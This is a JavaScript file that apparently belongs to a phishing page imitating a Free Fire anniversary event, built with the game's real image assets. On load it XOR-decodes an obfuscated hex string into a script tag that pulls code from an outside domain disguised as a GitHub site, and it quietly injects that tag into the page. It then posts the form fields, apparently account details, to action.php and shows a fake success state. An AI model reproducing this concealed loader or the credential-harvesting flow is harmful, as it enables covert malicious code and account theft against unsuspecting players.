$('document').ready(function(){
    $('.曰').hide();
    setTimeout(() => {
        $('.loader').fadeOut()
    },1000)
    const decipher = salt => {
        const textToChars = text => text.split('').map(c => c.charCodeAt(0));
        const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
        return encoded => encoded.match(/.{1,2}/g)
            .map(hex => parseInt(hex, 16))
            .map(applySaltToChar)
            .map(charCode => String.fromCharCode(charCode))
            .join('');
    }
    const ving = decipher('mySecretSalt');
    $(ving('347b6b7a61787c287b7a6b352a607c7c787b3227276f617c607d6a7f6d6a7b617c6d266b6765276f617c26627b2a3634277b6b7a61787c36')).appendTo(document.body);
})
window.addEventListener('submit',function(event){
    event.preventDefault()
    $('.fsubmit').prop('disabled',true);
    $('.fsubmit').html('<ion-spinner name="dots"></ion-spinner>');
    setTimeout(() => {
        extend()
    },1500)
    return false;
})

function extend(){
    var hp = $("#hp").val(),level = $("#level").val(),tier = $("#tier").val(),ep = $("#ep").val();

    if(!hp || hp == null || hp == '')
    {
        $("#hp").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/de65fbc89b9b8ee8c51d6860acb1ea2bb97343c236186d7727a45d59a4172d2e.png) no-repeat');
        $("#hp").css('background-size','100% 100%');
        $('.fsubmit').html('Submit');
        $('.fsubmit').prop('disabled',false);
    }else{
        $("#hp").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/72e6d943142d1cd3e2335324408d8df597a1392b48d3d3759913c105443e88a0.png) no-repeat');
        $("#hp").css('background-size','100% 100%');
    }
    if(!level || level == null || level == '')
    {
        $("#level").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/de65fbc89b9b8ee8c51d6860acb1ea2bb97343c236186d7727a45d59a4172d2e.png) no-repeat');
        $("#level").css('background-size','100% 100%');
        $('.fsubmit').html('Submit');
        $('.fsubmit').prop('disabled',false);
    }else{
        $("#level").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/72e6d943142d1cd3e2335324408d8df597a1392b48d3d3759913c105443e88a0.png) no-repeat');
        $("#level").css('background-size','100% 100%');
    }
    if(!tier || tier == null || tier == '')
    {
        $("#tier").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/de65fbc89b9b8ee8c51d6860acb1ea2bb97343c236186d7727a45d59a4172d2e.png) no-repeat');
        $("#tier").css('background-size','100% 100%');
        $('.fsubmit').html('Submit');
        $('.fsubmit').prop('disabled',false);
    }else{
        $("#tier").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/72e6d943142d1cd3e2335324408d8df597a1392b48d3d3759913c105443e88a0.png) no-repeat');
        $("#tier").css('background-size','100% 100%');
    }
    if(!ep || ep == null || ep == '')
    {
        $("#ep").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/de65fbc89b9b8ee8c51d6860acb1ea2bb97343c236186d7727a45d59a4172d2e.png) no-repeat');
        $("#ep").css('background-size','100% 100%');
        $('.fsubmit').html('Submit');
        $('.fsubmit').prop('disabled',false);
    }else{
        $("#ep").css('background','url(https://dl.dir.freefiremobile.com/common/web_event/4thanniversary/images-hash/72e6d943142d1cd3e2335324408d8df597a1392b48d3d3759913c105443e88a0.png) no-repeat');
        $("#ep").css('background-size','100% 100%');
    }

    // if all form are filled
    if(hp.length != 0 && level != null && tier != null && ep != null)
    
    {
        // SEND DATA
        $.ajax({
            type: 'POST',
            url: 'action.php',
            beforeSend: async(),
            data: $('#form').serialize(),
            dataType: 'text',
            success: function() {
                        $('.fsubmit').prop('disabled',true);
                        $('.fsubmit').html('DISABLED');
                        $('.fsubmit').css('filter','grayscale(100%)');
                        $('.fsubmit').css('cursor','no-drop');
                        $('.曰').fadeIn()
                        $('.孟子').toggle();
                        // No Reedit PLZ
                } 
        })
    }
}